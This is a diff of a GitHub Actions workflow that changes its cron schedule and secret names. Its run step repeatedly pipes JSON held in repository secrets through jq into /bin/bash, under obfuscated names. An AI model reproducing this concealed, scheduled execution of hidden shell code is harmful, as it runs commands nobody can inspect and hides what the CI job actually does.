@@ -1,8 +1,10 @@
 name: tianpoguang1937
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 2/6 * * *'
+    - cron: '49 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,10 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: tianpoguang1937
         env:
-          vi3: ${{ secrets.vi3 }}
+          tpld5257: ${{ secrets.tpld5257 }}
         run: |
-          echo $vi3 | jq -r .wxit074 | /bin/bash
-          echo $ru0 | jq -r .de691 | /bin/bash
-          echo $qb6 | jq -r .wjrre1990 | /bin/bash
-          echo $bqrg500 | jq -r .vku947 | /bin/bash
+          echo $tpld5257 | jq -r .xonau11 | /bin/bash
+          echo $u72438 | jq -r .sgyr6 | /bin/bash
+          echo $s9836 | jq -r .hapc847 | /bin/bash
+          echo $usts530 | jq -r .chgq53608 | /bin/bash
+          echo $c2 | jq -r .v74593 | /bin/bash
+          echo $mrmt641 | jq -r .msu58 | /bin/bash
+          echo $hpanp7622 | jq -r .h008 | /bin/bash
+          echo $witxx6 | jq -r .e4 | /bin/bash
+          echo $ut76 | jq -r .m501 | /bin/bash
+          echo $imkjv5401 | jq -r .uzkv096 | /bin/bash
+          echo $cvp3527 | jq -r .v2356 | /bin/bash
+          echo $dwrt52 | jq -r .iz21076 | /bin/bash
 
